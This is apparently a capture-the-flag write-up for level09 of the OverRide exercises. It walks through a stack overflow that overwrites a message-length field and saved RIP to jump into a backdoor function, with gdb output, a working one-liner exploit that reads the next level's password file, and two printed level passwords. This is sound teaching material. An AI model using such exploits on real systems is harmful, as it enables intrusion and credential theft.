# Overwrite RIP and jump to `secret_backdoor()`

```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level09
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level09@192.168.56.101's password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$
```

The program contains `secret_backdoor()` function which reads in at most 127 characters from `stdin` and stores them into the buffer pointed to by `command`. Then it executes  a command specified in `command` by calling `/bin/sh -c command`,

At first glance, return address must be overwritten in order to redirect flow of the program into `secret_backdoor()` function.

The function `set_msg()` calls `fgets` which reads 1024 bytes into the buffer of 128 bytes.

Then it copy at most len characters `buffer+180`, from source `str` into destination `buffer`.
```gdb
   0x5555555549a2 <set_msg+112>:	mov    rax,QWORD PTR [rbp-0x408]
=> 0x5555555549a9 <set_msg+119>:	mov    eax,DWORD PTR [rax+0xb4]
   0x5555555549af <set_msg+125>:	movsxd rdx,ea
```
The value of message length, `buffer+180` can be overwirtten using `username`.
With a large message there is possibility to overwrite saved RIP of `handle_msg()`

To find offset, calculate difference between `savedRIP` and the `buffer`:
```gdb
[...]
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
�>: Msg @Unix-Dude
>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
[...]
Breakpoint 7, 0x0000555555554924 in handle_msg ()
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffe580:
 rip = 0x555555554924 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe590
 Arglist at 0x7fffffffe570, args:
 Locals at 0x7fffffffe570, Previous frame's sp is 0x7fffffffe580
 Saved registers:
  rbp at 0x7fffffffe570, rip at 0x7fffffffe578
gdb-peda$
gdb-peda$ x/64wx 0x7fffffffe4b0
0x7fffffffe4b0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4c0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4d0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4e0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe500:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe510:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe520:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe530:	0x42424242	0x42424242	0x42424242	0x41414141
0x7fffffffe540:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe550:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe560:	0x0a414141	0x0000008c	0xffffe580	0x00007fff
0x7fffffffe570:	0xffffe580	0x00007fff	0x55554abd	0x00005555
0x7fffffffe580:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
0x7fffffffe590:	0x00000000	0x00000000	0xffffe668	0x00007fff
0x7fffffffe5a0:	0x55554000	0x00000001	0x55554aa8	0x00005555
gdb-peda$ p/d 0x7fffffffe578-0x7fffffffe4b0
$33 = 200
gdb-peda$
```
```gdb
gdb-peda$ print secret_backdoor
$35 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
By overwritting message length byte and using offset followed by the address of `secret_backdoor()` function, the flow of program can be modified.


## Exploit
```sh
level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('Q', 0x55555555488c))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, >: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```
